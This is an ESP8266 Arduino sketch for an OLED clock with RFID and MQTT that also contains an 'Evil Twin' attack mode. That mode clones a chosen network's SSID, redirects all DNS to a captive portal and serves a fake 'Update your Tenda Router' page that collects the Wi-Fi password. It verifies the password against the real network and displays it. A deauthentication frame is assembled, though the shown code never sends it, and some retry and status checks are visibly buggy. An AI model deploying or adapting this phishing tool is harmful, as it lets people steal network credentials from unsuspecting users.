#include <Arduino.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <SPI.h>
#include <MFRC522.h>
#include <ESP8266WiFi.h>
#include <PubSubClient.h>
#include <NTPClient.h>
#include <WiFiUdp.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

#define OLED_ADDR 0x3C
Adafruit_SSD1306 display(128, 64, &Wire, OLED_ADDR);

String ssid = "";
String password = "";
const char* mqtt_server = "test.mosquitto.org";

#define MSG_BUFFER_SIZE (50)
#define SS_PIN D2
#define RST_PIN D1

char msg[MSG_BUFFER_SIZE];
String weekDays[7]={"Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jum'at", "Sabtu"};
WiFiClient espClient;
PubSubClient client(espClient);
WiFiUDP ntpUDP;
NTPClient timeClient(ntpUDP, "pool.ntp.org");
unsigned long lastMsg = 0;
int value = 0;
MFRC522 rfid(SS_PIN, RST_PIN);
bool relayStatus = false;
char* msgB = "M.Thoriq";
const String SCAN_WIFI_COMMAND = "wifiScan";
bool normalMode = true;
bool canConnect = true;

void setup_wifi() {
  delay(10);
  Serial.println();
  Serial.print("Connecting to ");
  Serial.println(ssid);
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(3,2);
  display.print("connecting to");
  display.setCursor(3,14);
  display.print(ssid);
  display.display();
  delay(1000);
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);
  int Try = 0;
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
    if (Try <= 50) {
      Try = 0;
      canConnect = false;
      break;
    }
    Try++;
  }

  randomSeed(micros());

  Serial.println("");
  Serial.println("WiFi connect.");
  Serial.println("IP address: ");
  String ipadd = WiFi.localIP().toString();
  Serial.println(WiFi.localIP());
  display.setTextSize(1);
  display.setCursor(3,27);
  display.print("WiFi connect..");
  display.display();
  delay(1000);
  display.setCursor(3,37);
  display.print("IP address: ");
  display.setCursor(3,54);
  display.print(ipadd);
  display.display();
  delay(6000);
}

void callback(char* topic, byte* payload, unsigned int length) {
  String message = "";
  for (unsigned int i = 0; i < length; i++) {
    message += (char)payload[i];
  }
  Serial.println(message);
  strncpy(msg, message.c_str(), MSG_BUFFER_SIZE - 1);
  msg[MSG_BUFFER_SIZE - 1] = '\0';
  msgB = msg;
}

void reconnect() {
  int Try = 0;
  while (!client.connected()) {
    Serial.print("Attempting MQTT connection...");
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(3,2);
    display.print("MQTT connection...");
    display.display();
    String clientId = "ESP8266Client-";
    delay(1000);
    clientId += String(random(0xffff), HEX);
    if (client.connect(clientId.c_str())) {
      display.setTextSize(2);
      display.setCursor(3,17);
      display.print("Connected");
      display.display();
      Serial.println("connected");
      client.subscribe("naka/cank");
      delay(2000);
    } else {
      Serial.print("failed, rc=");
      Serial.print(client.state());
      Serial.println(" try again in 5 seconds");
      delay(5000);
      if (Try == 5) {
        Try = 0;
        break;
      }
      Try++;
    }
  }
}

void setup() {
  Serial.begin(9600);
  WiFi.mode(WIFI_STA);
  Wire.begin(D3, D4);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(6);
  display.setCursor(3,3);
  display.print("ON");
  display.display();
  SPI.begin();
  rfid.PCD_Init();
  setup_wifi();
  client.setServer(mqtt_server, 1883);
  client.setCallback(callback);
  timeClient.setTimeOffset(7 * 3600); 
  timeClient.begin();
  int TRY = 0;
  while (!timeClient.update()) {
    timeClient.forceUpdate();
    if (TRY <= 50) {
      canConnect = false;
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(3,3);
      display.print("Failed Connect NTP..");
      display.display();
      delay(3000);
      break;
    }
    TRY++;
  }
}

void drawAnalogClock(int hour, int minute, int second) {
  int centerX = 30;
  int centerY = 32;
  int hourX = centerX + 20 * cos((hour % 12 * 30 + minute / 2) * 0.0174533 - 1.5708);
  int hourY = centerY + 20 * sin((hour % 12 * 30 + minute / 2) * 0.0174533 - 1.5708);
  int minuteX = centerX + 25 * cos((minute * 6 + second / 10) * 0.0174533 - 1.5708);
  int minuteY = centerY + 25 * sin((minute * 6 + second / 10) * 0.0174533 - 1.5708);
  display.drawCircle(centerX, centerY, 30, WHITE);
  display.drawLine(centerX, centerY, hourX, hourY, WHITE);
  display.drawLine(centerX, centerY, minuteX, minuteY, WHITE);
  display.drawCircle(centerX, centerY, 2, WHITE);
}

void drawDigitalClock(int hour, int minute, int second) {
  display.setTextSize(2);
  display.setCursor(68, 0);
  if (hour < 10) {
    display.print("0");
  }
  display.print(hour);
  display.setCursor(90, 0);
  display.print(":");
  display.setCursor(100, 0);
  if (minute < 10) {
    display.print("0");
  }
  display.print(minute);
  display.setCursor(68, 18);
  if (second < 10) {
    display.print("0");
  }
  display.print(second);
}

void drawDate(int day, int month, int year) {
  String weekDay = weekDays[timeClient.getDay()];
  display.setTextSize(1);
  display.setCursor(68, 38);
  display.print(weekDay);
  display.setCursor(62,52);
  display.print(msgB);
  display.setCursor(94, 18);
  if (day < 10) {
    display.print("0");
  }
  display.print(day);
  display.setCursor(105, 18);
  display.print("/");
  if (month < 10) {
    display.print("0");
  }
  display.print(month);
  display.setCursor(95, 28);
  display.print(year);
}

void setupEvill() {
  normalMode = false;
  Serial.begin(9600);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("OPPO A12", "nakano22");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  display.clearDisplay();
  display.setTextSize(2);
  display.setCursor(3,2);
  display.print("Evil Twin");
  display.setTextSize(4);
  display.setCursor(3,24);
  display.print("MODE");
  display.display();

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<!DOCTYPE html><html><head><style>body{background-color:#f2f2f2;font-family:Arial,sans-serif}h2{color:#333333;text-align:center}p{text-align:center}</style><script>setTimeout(function(){window.location.href='/'},3000)</script><meta name='viewport' content='initial-scale=1.0,width=device-width'></head><body><h2>Wrong Password</h2><p>Please try again.</p></body></html>");
  } else {
    
    WiFi.softAPdisconnect(true);
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    String content = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'></head><body><h2>Good password: " + _correct + "</h2></body></html>";
    webServer.send(200, "text/html", content);
    hotspot_active = false;
    dnsServer.stop();
    Serial.println("Good password was entered !");
    display.clearDisplay();
    display.setCursor(3,3);
    display.println("Wifi :");
    display.setCursor(3,15);
    display.println( _selectedNetwork.ssid);
    display.setCursor(3,30);
    display.println("Password :");
    display.setCursor(3,45);
    display.println(_tryPassword);
    display.display();
    ssid = _selectedNetwork.ssid;
    password = _tryPassword;
    while (true) {
      if (Serial.available() > 0) {
        String receivedSSID = Serial.readStringUntil('\n');
        receivedSSID.trim();
        if (receivedSSID == "EndMode") {
          
          normalMode = true;
          break;
        }
      }
    }
    setup();
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style>body{background-color:#1a1a1a;min-width: 500px;min-height: 600px;color:#ffffff;font-family:Arial,sans-serif}.content{width:460px;margin:auto;margin-top: 10%;padding:20px;border:2px solid #ffffff;border-radius:10px}table{width:100%;margin-top:20px}th,td{border:1px solid #ffffff;padding:5px;text-align:left}th{background-color:#333333}.button-container{margin-top:20px;display:flex;justify-content:center}button{background-color:#4CAF50;color:#ffffff;border:none;padding:7px 7px;margin-right: 10px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:3px}.button:disabled{background-color:#808080;cursor:not-allowed}h3{text-align:center}.footer{margin-top:20px;font-size:12px;text-align:center;color:#808080}</style>"
                   "</head><body><div class='content'><h3>Admin Control</h3>"
                   "<div class='button-container'><form style='display:inline-block;'method='post' action='/?deauth={deauth}'>"
                   "<button {disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block;' method='post' action='/?hotspot={hotspot}'>"
                   "<button {disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("OPPO A12", "nakano22");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div><p class='footer'>- Nakano Kurumi -</p><p class='footer'>&copy; 2023 YourCompany. All rights reserved.</p></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html><html><head><style>body{background-color:#f2f2f2;font-family:Arial,sans-serif}h2{color:#333333;text-align:center}.loader{display:flex;justify-content:center;align-items:center;height:100vh}.loader-text{font-size:20px}</style><script>setTimeout(function(){window.location.href='/result'},15000);</script></head><body><div class='loader'><h2 class='loader-text'>Updating, please wait...</h2></div></body></html>");
    } else {
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><head><style>body { background-color: #f2f2f2; font-family: Arial, sans-serif; } h2 { color: #333333; text-align: center; } form { width: 300px; margin: 0 auto; } label { display: block; margin-bottom: 10px; font-weight: bold; } input[type='text'] { width: 100%; padding: 8px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; } input[type='submit'] { width: 100%; padding: 10px; background-color: #4caf50; color: white; border: none; border-radius: 4px; cursor: pointer; } input[type='submit']:hover { background-color: #45a049; } footer { margin-top: 20px; text-align: center; font-size: 12px; color: #999999; } </style></head><body><h2>Update your Tenda Router - '" + _selectedNetwork.ssid + "'</h2><div><p>Keeping your router up-to-date is important to ensure optimal performance, security, and new features. By updating your Tenda router, you can:</p><ul><li>Enhance network stability and speed</li><li>Fix any known security vulnerabilities</li><li>Access new features and improvements</li></ul></div><form action='/'><label for='password'>Enter Password:</label><input type='text' id='password' name='password' placeholder='Your password' minlength='8'><input type='submit' value='Submit'></form><footer>&copy; 2023 Your Company. All rights reserved.</footer></body></html>");
    }
  }

}

void handleAdmin() {
  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("OPPO A12", "nakano22");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div><p class='footer'>- Nakano Kurumi -</p><p class='footer'>&copy; 2023 YourCompany. All rights reserved.</p></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  if (normalMode){
    if (!client.connected()) {
      reconnect();
    }else if (canConnect = false) {
      display.clearDisplay();
      display.setTextSize(2);
      display.setCursor(3,2);
      display.print("Can't Connect");
      display.display();
    }
    client.loop();
    if (Serial.available() > 0) {
      String receivedCommand = Serial.readStringUntil('\n');
      receivedCommand.trim();
      if (receivedCommand == SCAN_WIFI_COMMAND) {
        delay(2000);
        Serial.println("Scanning Wi-Fi networks...");
        delay(1000);
        int networksCount = WiFi.scanNetworks();
        if (networksCount == 0) {
          Serial.println("No Wi-Fi networks found.");
        } else {
          delay(500);
          for (int i = 0; i < networksCount; i++) {
            Serial.println(WiFi.SSID(i));
            delay(500);
          }
          delay(1000);
          Serial.println("END");
        }
      }else if (receivedCommand == "Eviltwin Mode") {
        delay(2000);
        Serial.println("EvillTwinON");
        delay(500);
        display.clearDisplay();
        display.setTextSize(2);
        display.setCursor(3,2);
        display.print("Evil Twin");
        display.setTextSize(4);
        display.setCursor(3,24);
        display.print("MODE");
        display.display();
        setupEvill();
      }
    }

    if (rfid.PICC_IsNewCardPresent() && rfid.PICC_ReadCardSerial()) {
      String cardNumber = "";
      for (byte i = 0; i < rfid.uid.size; i++) {
        cardNumber += String(rfid.uid.uidByte[i] < 0x10 ? "0" : "");
        cardNumber += String(rfid.uid.uidByte[i], HEX);
      }
      rfid.PICC_HaltA();
      if (cardNumber == "53cf13ad"){
        msgB = "Card 1";
      }else if (cardNumber == "033bd61b"){
        msgB = "Card 2";
      }
      Serial.println(cardNumber);
    }
    timeClient.update();
    int hour = timeClient.getHours();
    int minute = timeClient.getMinutes();
    int second = timeClient.getSeconds();
    time_t epochTime = timeClient.getEpochTime();
    struct tm *ptm = gmtime(&epochTime);
    int day = ptm->tm_mday;
    int month = ptm->tm_mon + 1;
    int year = ptm->tm_year + 1900; 

    display.clearDisplay();
    drawAnalogClock(hour, minute, second);
    drawDigitalClock(hour, minute, second);
    drawDate(day, month, year);
    display.display();
    delay(1000);
  } else {
    display.clearDisplay();
    display.setTextSize(2);
    display.setCursor(3,2);
    display.print("Evil Twin");
    display.setTextSize(4);
    display.setCursor(3,24);
    display.print("MODE");
    display.display();
    dnsServer.processNextRequest();
    webServer.handleClient();

  if (Serial.available() > 0) {
      String receivedSSID = Serial.readStringUntil('\n');
      receivedSSID.trim();
      if (receivedSSID == "EndMode") {
        normalMode = true;
        setup();
      }
    }

    if (deauthing_active && millis() - deauth_now >= 1000) {

      wifi_set_channel(_selectedNetwork.ch);
      uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
      memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
      memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
      deauthPacket[24] = 1;
      deauthPacket[0] = 0xC0;
      deauthPacket[0] = 0xA0;
      deauth_now = millis();
    }
    if (millis() - now >= 15000) {
      performScan();
      now = millis();
    }

    if (millis() - wifinow >= 2000) {
      wifinow = millis();
    }
  }
}